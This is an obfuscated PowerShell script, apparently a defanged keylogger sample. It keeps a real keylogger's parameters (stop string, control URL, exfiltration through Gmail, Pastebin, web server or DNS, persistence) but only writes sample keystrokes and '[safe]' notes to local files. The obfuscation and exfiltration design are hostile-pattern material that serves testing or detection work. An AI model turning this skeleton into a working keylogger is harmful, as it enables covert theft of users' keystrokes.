function Keylogger {
    [CmdletBinding()]
    param(
        [string]${MaGi`C`s`TRING} = "stopthis",
        [string]${c`HE`ckUrL} = "https://example.invalid/control.txt",
        [switch]${EX`FiL},
        [ValidateSet("gmail", "pastebin", "WebServer", "DNS")]
        [string]${e`XFiL`oPT`Ion} = "WebServer",
        [string]${U`Rl} = "https://collector.example.invalid/ingest",
        [switch]${pEr`sISt},
        [string]${sAm`pLEi`N`put} = "demo.user<Tab>hello123<Enter>"
    )
    ${Art`ifAct`D`IR} = .("{1}{0}{2}" -f 'in-P','Jo','ath') ${PS`SCRi`P`TroOT} "artifacts\keylogger"
    if (-not (.("{2}{1}{0}" -f 'Path','-','Test') ${AR`T`IfAc`TDIR})) {
        ${Nu`ll} = .("{2}{0}{1}"-f'w-','Item','Ne') -ItemType Directory -Path ${A`R`TiFAC`TdiR} -Force
    }
    ${lo`G`PaTH} = &("{2}{1}{0}"-f '-Path','in','Jo') ${ARt`I`FaCT`Dir} "key.log"
    ${CA`Ptu`Re} = ${SAm`pl`eINPUT} `
        -replace "<Tab>", "[TAB]" `
        -replace "<Enter>", "[ENTER]"
    .("{2}{1}{0}" -f'Content','t-','Se') -Path ${l`Og`patH} -Value ${CAPTU`Re} -Encoding UTF8
    .("{2}{0}{3}{1}"-f 'te-Out','t','Wri','pu') "[safe] Simulated keystrokes written to $logPath"
    if (${pER`S`IST}) {
        ${Per`sistN`O`Te} = &("{2}{1}{0}" -f 'th','n-Pa','Joi') ${arTifA`C`TDIr} "persistence-note.txt"
        .("{0}{2}{1}"-f 'Set-Con','nt','te') -Path ${Pe`Rsi`stNotE} -Value "[safe] Persistence requested but not installed." -Encoding UTF8
        &("{1}{3}{2}{0}" -f'utput','Wr','te-O','i') "[safe] Persistence step was simulated only."
    }
    if (${eX`FIl}) {
        ${eX`FI`LPath} = .("{1}{0}" -f '-Path','Join') ${ARtI`FAc`TDIR} ("exfil-" + ${e`XF`ilopTi`on}.ToLower() + ".txt")
        switch (${eXfiLOP`T`I`on}) {
            "gmail" {
                ${CO`NTE`NT} = @(
                    "[safe] Would send email exfiltration."
                    "SMTP: smtp.gmail.com"
                    "Message: $capture"
                )
            }
            "pastebin" {
                ${contE`Nt} = @(
                    "[safe] Would create a paste."
                    "Endpoint: https://pastebin.com/api/api_post.php"
                    "Body: $capture"
                )
            }
            "DNS" {
                ${contE`NT} = @(
                    "[safe] Would exfiltrate via DNS."
                    "Query: $capture"
                )
            }
            default {
                ${cON`TE`Nt} = @(
                    "[safe] Would POST captured keys to web server."
                    "URL: $URL"
                    "Body: $capture"
                )
            }
        }
        .("{0}{2}{1}"-f 'Se','Content','t-') -Path ${E`xf`il`pATh} -Value ${contE`NT} -Encoding UTF8
        .("{3}{1}{2}{0}"-f 'tput','te','-Ou','Wri') "[safe] Exfiltration simulated via $ExfilOption."
    }
    .("{1}{2}{0}" -f 'ut','Write','-Outp') "[safe] Magic stop string remains configured as '$MagicString' from $CheckURL"
}
.("{0}{1}{2}"-f 'K','eylog','ger') -Exfil -ExfilOption WebServer -URL "https://collector.example.invalid/ingest"
